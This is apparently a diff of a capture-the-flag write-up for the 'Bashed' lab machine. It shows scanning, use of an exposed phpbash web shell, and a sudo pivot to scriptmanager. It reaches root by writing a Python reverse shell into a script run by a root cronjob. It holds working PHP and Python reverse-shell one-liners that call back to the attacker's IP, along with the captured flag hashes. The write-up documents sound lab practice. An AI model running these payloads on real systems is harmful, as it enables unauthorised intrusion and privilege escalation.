@@ -4,6 +4,8 @@
 
 ### Tools: Nmap, msfexploit
 
+Running Nmap we get port 80 running Apache 2.4.18. Curl did not give anything extra and an Nmap scripot scan did not find anything. We did get some luck with Dirb and we can check that part out.
+
 ```console
 └──╼ [★]$ sudo nmap -sC -A -O 10.129.64.44
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 17:02 BST
@@ -37,8 +39,6 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
 ```
-
-
 ```console
 └──╼ [★]$ curl -I http://10.129.64.44
 HTTP/1.1 200 OK
@@ -110,12 +110,12 @@ GENERATED WORDS: 4612
 END_TIME: Mon Aug 15 17:06:36 2022
 DOWNLOADED: 9224 - FOUND: 3
 ```
+The /dev directory looks the most interesting and digging slightly further takes us to http://10.129.64.44/dev/phpbash.php
+
+Easy day. We can already navigate to and grab the user flag. Since we have a php bash lets create a reverse shell with it.
 
 ```console
-
-www-data@bashed
-:/var/www/html/dev# ls
-
+www-data@bashed:/var/www/html/dev# ls
 phpbash.min.php
 phpbash.php
 ```
@@ -125,6 +125,8 @@ www-data@bashed
 
 343cfcbe7fd570aa1a5218f0db7e0946
 ```
+We set up the listener and run the script and we are in.
+
 ```console
 bashed:/# php -r '$sock=fsockopen("10.10.14.93",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
@@ -138,6 +140,7 @@ Ncat: Connection from 10.129.64.44:33962.
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
+We still can't do anything different but running sudo -l shows that scriptmanager can be used. Note: running the reverse shell ro use script manager is required since the limited php shell from the webpage would not allow the sudo command with scriptmanager.
 
 ```console
 $ sudo -l
@@ -152,6 +155,7 @@ bash: cannot set terminal process group (879): Inappropriate ioctl for device
 bash: no job control in this shell
 scriptmanager@bashed:/$ ls
 ```
+Awesome now we are scriptmanager but we cannot access the root directory yet. There is an interesting directory labeled /scripts. This directory has a python script and a text file. My first assumption was that I could create a script to read the root.txt flag but my scripting is limited. I noticed that the .txt and .py were updating at the same time which suggests a cronjob being ran by root. With this we have our last step.
 
 ```console
 scriptmanager@bashed:/$ cd scripts
@@ -179,6 +183,10 @@ drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
 -rw-r--r--  1 scriptmanager scriptmanager  110 Aug 15 10:19 test.py
 -rw-r--r--  1 root          root            12 Aug 15 10:19 test.txt
 ```
+We are going to set up 1 last reverse shell in order to gain root. We are going to make our own reverse shell script taken from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+We are going to use the python reverse shell since its being executed in a python script and set up our listener to catch it. After a minute or so the cronjob executes the script from the directory and we get our reverse shell and the flag!!
+
 ```console
 scriptmanager@bashed:/scripts$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.93",1235));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > sol.py
 <);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > sol.py  
@@ -201,3 +209,4 @@ uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
 353dbd73edc7c3073b68d735599731c9
 ```
+WHOOOOOO!!!!
